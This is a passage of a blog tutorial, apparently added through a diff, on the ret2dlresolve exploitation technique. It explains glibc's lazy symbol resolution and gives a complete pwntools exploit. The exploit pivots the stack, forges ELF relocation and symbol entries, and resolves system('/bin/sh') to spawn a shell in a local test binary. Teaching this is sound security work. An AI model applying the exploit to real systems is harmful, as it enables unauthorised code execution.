+<p>So, both of them will push a value, then both will call a final part which will push another value (the same for both) and then call <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve_xsavec</code>. <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve_xsavec</code> will later call <code class="language-plaintext highlighter-rouge">_dl_fixup</code>.</p>
+
+<p>Let’s break down what happened here. The code is way longer, but a simplistic view would be:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_dl_fixup</span><span class="p">(</span><span class="n">link_map</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">Elf64_Rel</span> <span class="o">*</span><span class="n">rel_entry</span> <span class="o">=</span> <span class="n">JMPREL</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
+    <span class="n">Elf64_Sym</span> <span class="o">*</span><span class="n">sym_entry</span> <span class="o">=</span> <span class="n">SYMTAB</span><span class="p">[</span><span class="n">rel_entry</span><span class="o">-&gt;</span><span class="n">getSymbol</span><span class="p">()];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">sym_name</span> <span class="o">=</span> <span class="n">STRTAB</span> <span class="o">+</span> <span class="n">sym_entry</span><span class="o">-&gt;</span><span class="n">st_name</span> <span class="p">;</span>
+    <span class="p">...</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">symbol_address</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span><span class="p">(</span><span class="n">sym_name</span><span class="p">,</span> <span class="n">link_map</span><span class="p">,</span> <span class="p">...);</span>
+    <span class="c1">// now call the resolved symbol with the right args</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We won’t get into <code class="language-plaintext highlighter-rouge">link_map</code> too much but it contains the information about the loaded libraries.</p>
+
+<blockquote>
+  <p>Reference for <a href="https://github.com/lattera/glibc/blob/master/elf/dl-runtime.c#L61">_dl_fixup</a> code.
+Reference for <a href="https://github.com/bminor/glibc/blob/d49cd6a1913da9744b9a0ffbefb3f7958322382e/sysdeps/x86_64/dl-trampoline.h#L37">_dl_runtime_resolve</a></p>
+</blockquote>
+
+<p>Now it’s time to talk about the missing pieces Elf64_Sym, SYMTAB and <code class="language-plaintext highlighter-rouge">.dynsym</code></p>
+
+<hr />
+<h4 id="symtab-and-elf64_sym">SYMTAB and Elf64_Sym</h4>
+
+<p>This structure has multiple fields, but the one we really care about is:</p>
+
+<p><code class="language-plaintext highlighter-rouge">st_name</code>: this is the offset (not index) in STRTAB (or <code class="language-plaintext highlighter-rouge">.dynstr</code>) of the string with the name of the function.</p>
+
+<blockquote>
+  <p>Reference for <a href="https://llvm.org/doxygen/structllvm_1_1ELF_1_1Elf64__Sym.html">Elf64_Sym</a></p>
+</blockquote>
+
+<hr />
+
+<p>So to recap what happens when <code class="language-plaintext highlighter-rouge">gets</code> is called:</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">gets</code> is called, which actually is <code class="language-plaintext highlighter-rouge">gets@plt</code>.</li>
+  <li>This plt entry references the address from the Elf64_Rel entry (r_offset).</li>
+  <li>This code pushes the index for the Elf64_Rel.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">link_map</code> address is pushed.</li>
+  <li>We call _dl_runtime_resolve that gets the Elf64_Rel, gets the Elf64_Sym through the getSymbol(), gets the name of the actual function to be resolved, in our case <code class="language-plaintext highlighter-rouge">gets</code> and calls <code class="language-plaintext highlighter-rouge">_dl_fixup</code> to actually resolve the symbol.</li>
+  <li>Finally, before exiting, calls the function with the original arguments.</li>
+</ol>
+
+<p>The final diagram after the symbol is resolved looks like:</p>
+
+<p><img src="/./assets/imgs/ret2dlresolve_resolved.png" /></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Now the concept for the exploit is simple. We need to create fake Elf64_Rel and Elf64_Sym entries that contain
+the needed pieces to resolve the symbol we want, in our case, <code class="language-plaintext highlighter-rouge">system</code>. Let’s see how we can craft it.</p>
+
+<p>The full exploit is as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./test</span><span class="sh">'</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p, gdbscript="b *main+61")
+</span><span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./test</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="sh">"""</span><span class="s">
+	0x0000000000400318 - 0x0000000000400334 is .interp
+	0x0000000000400338 - 0x0000000000400368 is .note.gnu.property
+	0x0000000000400368 - 0x000000000040038c is .note.gnu.build-id
+	0x000000000040038c - 0x00000000004003ac is .note.ABI-tag
+	0x00000000004003b0 - 0x00000000004003cc is .gnu.hash
+	0x00000000004003d0 - 0x0000000000400448 is .dynsym
+	0x0000000000400448 - 0x0000000000400495 is .dynstr
+	0x0000000000400496 - 0x00000000004004a0 is .gnu.version
+	0x00000000004004a0 - 0x00000000004004d0 is .gnu.version_r
+	0x00000000004004d0 - 0x0000000000400500 is .rela.dyn
+	0x0000000000400500 - 0x0000000000400530 is .rela.plt
+	0x0000000000401000 - 0x000000000040101b is .init
+	0x0000000000401020 - 0x0000000000401050 is .plt
+	0x0000000000401050 - 0x0000000000401070 is .plt.sec
+	0x0000000000401070 - 0x0000000000401193 is .text
+	0x0000000000401194 - 0x00000000004011a1 is .fini
+	0x0000000000402000 - 0x0000000000402004 is .rodata
+	0x0000000000402004 - 0x0000000000402040 is .eh_frame_hdr
+	0x0000000000402040 - 0x0000000000402104 is .eh_frame
+	0x0000000000403df8 - 0x0000000000403e00 is .init_array
+	0x0000000000403e00 - 0x0000000000403e08 is .fini_array
+	0x0000000000403e08 - 0x0000000000403fd8 is .dynamic
+	0x0000000000403fd8 - 0x0000000000403fe8 is .got
+	0x0000000000403fe8 - 0x0000000000404010 is .got.plt
+	0x0000000000404010 - 0x0000000000404020 is .data
+	0x0000000000404020 - 0x0000000000404028 is .bss
+</span><span class="sh">"""</span>
+
+<span class="n">elf_load_address_fixup</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">-</span> <span class="n">elf</span><span class="p">.</span><span class="n">load_addr</span>
+<span class="n">ELF64_REL_LIST</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">dynamic_value_by_tag</span><span class="p">(</span><span class="sh">"</span><span class="s">DT_JMPREL</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">elf_load_address_fixup</span>
+<span class="n">ELF64_SYM_LIST</span> <span class="o">=</span>  <span class="n">elf</span><span class="p">.</span><span class="nf">dynamic_value_by_tag</span><span class="p">(</span><span class="sh">"</span><span class="s">DT_SYMTAB</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">elf_load_address_fixup</span>
+<span class="n">FUNCTION_NAMES_LIST</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">dynamic_value_by_tag</span><span class="p">(</span><span class="sh">"</span><span class="s">DT_STRTAB</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">elf_load_address_fixup</span>
+<span class="n">RESOLVER</span> <span class="o">=</span> <span class="mh">0x401020</span>
+
+<span class="n">PIVOTED_STACK</span> <span class="o">=</span> <span class="mh">0x0000000000404f10</span>
+<span class="n">FINAL_STACK</span> <span class="o">=</span> <span class="mh">0x0000000000404da0</span>
+
+<span class="n">STRING_ADDRESS</span> <span class="o">=</span> <span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x10</span>
+<span class="n">REL_ENTRY_ADDRESS</span> <span class="o">=</span> <span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x30</span>
+<span class="n">SYM_ENTRY_ADDRESS</span> <span class="o">=</span> <span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x20</span>
+
+<span class="sh">"""</span><span class="s">
+// Relocation entry, without explicit addend.
+struct Elf64_Rel {
+  Elf64_Addr r_offset; // Location (file byte offset, or program virtual addr).
+  Elf64_Xword r_info;  // Symbol table index and type of relocation to apply.
+ 
+  // These accessors and mutators correspond to the ELF64_R_SYM, ELF64_R_TYPE,
+  // and ELF64_R_INFO macros defined in the ELF specification:
+  Elf64_Word getSymbol() const { return (r_info &gt;&gt; 32); }
+  Elf64_Word getType() const { return (Elf64_Word)(r_info &amp; 0xffffffffL); }
+  void setSymbol(Elf64_Word s) { setSymbolAndType(s, getType()); }
+  void setType(Elf64_Word t) { setSymbolAndType(getSymbol(), t); }
+  void setSymbolAndType(Elf64_Word s, Elf64_Word t) {
+    r_info = ((Elf64_Xword)s &lt;&lt; 32) + (t &amp; 0xffffffffL);
+  }
+};
+</span><span class="sh">"""</span>
+<span class="n">fake_rel_entry_offset</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">gets</span><span class="sh">'</span><span class="p">])</span> <span class="c1"># Replace gets
+# Calculation would be ELF64_SYM_LIST + index * sizeof(Elf64_Sym), being the size 24
+</span><span class="nf">assert</span><span class="p">((</span><span class="n">SYM_ENTRY_ADDRESS</span> <span class="o">-</span> <span class="n">ELF64_SYM_LIST</span><span class="p">)</span> <span class="o">%</span> <span class="mi">24</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># We need to assert the address is divisible by Elf64_Sym size (24)
+</span><span class="n">index</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="n">SYM_ENTRY_ADDRESS</span> <span class="o">-</span> <span class="n">ELF64_SYM_LIST</span><span class="p">)</span> <span class="o">/</span> <span class="mi">24</span><span class="p">)</span>
+<span class="n">fake_rel_entry_info</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">((</span><span class="n">index</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span><span class="p">)</span>
+<span class="n">fake_rel_entry</span> <span class="o">=</span> <span class="n">fake_rel_entry_offset</span> <span class="o">+</span> <span class="n">fake_rel_entry_info</span>
+<span class="n">rel_offset</span> <span class="o">=</span> <span class="n">REL_ENTRY_ADDRESS</span> <span class="o">-</span> <span class="n">ELF64_REL_LIST</span>
+
+<span class="sh">"""</span><span class="s">
+// Symbol table entries for ELF64.
+struct Elf64_Sym {
+  Elf64_Word st_name;     // Symbol name (index into string table)
+};
+ 
+// The size (in bytes) of symbol table entries.
+enum {
+  SYMENTRY_SIZE64 = 24  // 64-bit symbol entry size.
+};
+</span><span class="sh">"""</span>
+
+<span class="n">fake_sym_entry</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">STRING_ADDRESS</span> <span class="o">-</span> <span class="n">FUNCTION_NAMES_LIST</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+
+<span class="sh">"""</span><span class="s">
+_dl_fixup(link_map, index) {
+    Elf64_Rel *rel_entry = JMPREL[index] ;
+    Elf64_Sym *sym_entry = SYMTAB[rel_entry-&gt;getSymbol()];
+    char *sym_name = STRTAB + sym_entry -&gt; st_name ;
+    void *symbol_address = _dl_fixup(link_map, sym_name);
+    // now call the resolved symbol
+    _dl_lookup_symbol_x(arg1, arg2...)
+}
+</span><span class="sh">"""</span>
+
+<span class="c1"># Stack pivot 
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Stack pivoting performed to </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] REL LIST ADDR: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">ELF64_REL_LIST</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] SYM LIST ADDR: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">ELF64_SYM_LIST</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] STR LIST ADDR: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">FUNCTION_NAMES_LIST</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Setting </span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="s"> at </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">STRING_ADDRESS</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Setting El64_Sym at </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">SYM_ENTRY_ADDRESS</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">    * String index at: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">STRING_ADDRESS</span> <span class="o">-</span> <span class="n">FUNCTION_NAMES_LIST</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Setting El64_Rel at </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">REL_ENTRY_ADDRESS</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">    * Replacing gets at: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">gets</span><span class="sh">"</span><span class="p">])</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    * Fake index is at: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="si">}</span><span class="s"> :: final r_info: </span><span class="si">{</span><span class="nf">hex</span><span class="p">((</span><span class="n">index</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">=</span>  <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">FINAL_STACK</span><span class="p">)</span> <span class="c1"># The resolve functions will use a lot of memory, we need as much room as we can get.
+</span><span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="se">\x00\x00</span><span class="sh">"</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="n">fake_sym_entry</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="n">fake_rel_entry</span> 
+<span class="n">exploit</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">'</span><span class="s">[O] Structures set</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># Set string
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">assert</span><span class="p">(</span><span class="n">rel_offset</span> <span class="o">%</span> <span class="mi">24</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># We need to assert the address is divisible by Elf64_Rel size (24)
+</span><span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Launching dl_resolve... with rel at offset </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">rel_offset</span><span class="o">/</span><span class="mi">24</span><span class="p">))</span><span class="si">}</span><span class="s"> - real </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">rel_offset</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">RESOLVER</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">rel_offset</span><span class="o">/</span><span class="mi">24</span><span class="p">))</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Final stack addr at </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">'</span><span class="s">**************************************************</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">'</span><span class="s">All set; that was a nice ride; here is your shell :)</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>but let’s break it piece by piece.</p>
+
+<h3 id="figure-out-the-locations">Figure out the locations</h3>
+
+<p>For this task, I relied on the approach <a href="https://github.com/Gallopsled/pwntools/blob/db98e5edfb/pwnlib/rop/ret2dlresolve.py#L228C1-L232C90">from pwntools</a> to resolve the addresses:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">elf_load_address_fixup</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">-</span> <span class="n">elf</span><span class="p">.</span><span class="n">load_addr</span>
+<span class="n">ELF64_REL_LIST</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">dynamic_value_by_tag</span><span class="p">(</span><span class="sh">"</span><span class="s">DT_JMPREL</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">elf_load_address_fixup</span>
+<span class="n">ELF64_SYM_LIST</span> <span class="o">=</span>  <span class="n">elf</span><span class="p">.</span><span class="nf">dynamic_value_by_tag</span><span class="p">(</span><span class="sh">"</span><span class="s">DT_SYMTAB</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">elf_load_address_fixup</span>
+<span class="n">FUNCTION_NAMES_LIST</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">dynamic_value_by_tag</span><span class="p">(</span><span class="sh">"</span><span class="s">DT_STRTAB</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">elf_load_address_fixup</span>
+<span class="n">RESOLVER</span> <span class="o">=</span> <span class="mh">0x401020</span>
+</code></pre></div></div>
+
+<p>But you can obviously resolve them by hand. Using gef we can debug the program and run <code class="language-plaintext highlighter-rouge">xfiles</code> to get the offsets.
+With regular gdb it can be done with <code class="language-plaintext highlighter-rouge">info files</code>.</p>
+
+<p>These addresses are needed to calculate the indexes so <code class="language-plaintext highlighter-rouge">_dl_resolve</code> can resolve our fake structures.</p>
+
+<p>Based on this, we will place our structures in a rw controlled area: .data + .bss:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PIVOTED_STACK</span> <span class="o">=</span> <span class="mh">0x0000000000404f10</span>
+<span class="n">FINAL_STACK</span> <span class="o">=</span> <span class="mh">0x0000000000404da0</span>
+
+<span class="n">STRING_ADDRESS</span> <span class="o">=</span> <span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x10</span>
+<span class="n">REL_ENTRY_ADDRESS</span> <span class="o">=</span> <span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x30</span>
+<span class="n">SYM_ENTRY_ADDRESS</span> <span class="o">=</span> <span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x20</span>
+</code></pre></div></div>
+
+<h3 id="prepare-fake-elf64_rel-entry">Prepare fake Elf64_Rel entry</h3>
+
+<p>For the fake Elf64_Rel we need to provide:</p>
+
+<ul>
+  <li>
+    <p>The entry on the GOT table we want to replace with our function address, in our case, <code class="language-plaintext highlighter-rouge">gets</code> but it could be any address. 
+We will talk later about why to replace an existing function.</p>
+  </li>
+  <li>
+    <p>The index of our fake Elf64_Sym. Also, we need to set the type to 7 (R_X86_64_JUMP_SLOT)</p>
+  </li>
+</ul>
+
+<p>Finally, we need to calculate the index that we need to provide <code class="language-plaintext highlighter-rouge">_dl_resolve</code> so it points to this fake Elf64_Rel structure.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_rel_entry_offset</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">gets</span><span class="sh">'</span><span class="p">])</span> <span class="c1"># Replace gets
+# Calculation would be ELF64_SYM_LIST + index * sizeof(Elf64_Sym), being the size 24
+</span><span class="nf">assert</span><span class="p">((</span><span class="n">SYM_ENTRY_ADDRESS</span> <span class="o">-</span> <span class="n">ELF64_SYM_LIST</span><span class="p">)</span> <span class="o">%</span> <span class="mi">24</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># We need to assert the address is divisible by Elf64_Sym size (24)
+</span><span class="n">index</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="n">SYM_ENTRY_ADDRESS</span> <span class="o">-</span> <span class="n">ELF64_SYM_LIST</span><span class="p">)</span> <span class="o">/</span> <span class="mi">24</span><span class="p">)</span>
+<span class="n">fake_rel_entry_info</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">((</span><span class="n">index</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span><span class="p">)</span>
+<span class="n">fake_rel_entry</span> <span class="o">=</span> <span class="n">fake_rel_entry_offset</span> <span class="o">+</span> <span class="n">fake_rel_entry_info</span>
+<span class="n">rel_offset</span> <span class="o">=</span> <span class="n">REL_ENTRY_ADDRESS</span> <span class="o">-</span> <span class="n">ELF64_REL_LIST</span>
+<span class="bp">...</span>
+<span class="n">rel_offset</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">rel_offset</span> <span class="o">/</span> <span class="mi">24</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="prepare-fake-elf64_sym-entry">Prepare fake Elf64_Sym entry</h3>
+
+<p>The Elf64_Sym is simpler. All we need to set is the offset of our string <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">fake_sym_entry = p64(STRING_ADDRESS - FUNCTION_NAMES_LIST) + p64(0x00)</code></p>
+
+<h3 id="launching-dl_resolve">Launching dl_resolve</h3>
+
+<p>Now that we are ready, let’s send the exploit.</p>
+
+<ol>
+  <li>Pivot the stack to where we are placing all the structures.</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Stack pivoting performed to </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Send the structures alongside with the string.</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">=</span>  <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">FINAL_STACK</span><span class="p">)</span> <span class="c1"># The resolve functions will use a lot of memory, we need as much room as we can get.
+</span><span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="se">\x00\x00</span><span class="sh">"</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="n">fake_sym_entry</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="n">fake_rel_entry</span> 
+<span class="n">exploit</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
